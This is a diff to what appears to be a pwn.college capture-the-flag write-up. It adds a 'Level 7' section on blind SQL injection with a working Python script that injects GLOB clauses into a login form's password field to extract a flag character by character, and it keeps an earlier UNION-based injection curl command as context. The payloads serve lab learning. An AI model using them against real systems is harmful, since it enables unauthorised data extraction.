@@ -161,3 +161,43 @@ This gives me the table name `table13213357520839709907` which I can use like in
 ```sh
 curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20password%20FROM%20table13213357520839709907%20--
 ```
+
+## Level 7 - Blind SQL injection
+
+In a blind SQL injection, you must infer the data based on side effects in the web application. In this case, I create a SQL Injection attack that looks for passwords like `pwn.college{%`. If I can log in, the password that I have so far is correct, if I can't, then it is incorrect. I can then loop through all the possible characters to find each character in the password.
+
+```python
+#!/usr/bin/env python3
+
+import requests
+import json
+
+flag = 'pwn.college{'
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+
+while True:
+    # Loop from space to tilde ~
+    for c in range(32, 127):
+        # skip * and ? from the glob
+        if c == 42 or c == 63:
+            continue
+
+        char = chr(c)
+
+        data = {
+            'username': 'flag',
+            'password': f"\" OR password GLOB '{flag}{char}*' --"
+        }
+        r = requests.post('http://challenge.localhost:80', headers=headers, data=data)
+
+        # Check the response
+        if r.status_code == 200:
+            flag += char
+            print(flag)
+            break
+
+    if flag[-1] == '}':
+        break
+
+print("Pwn'd the flag")
+```
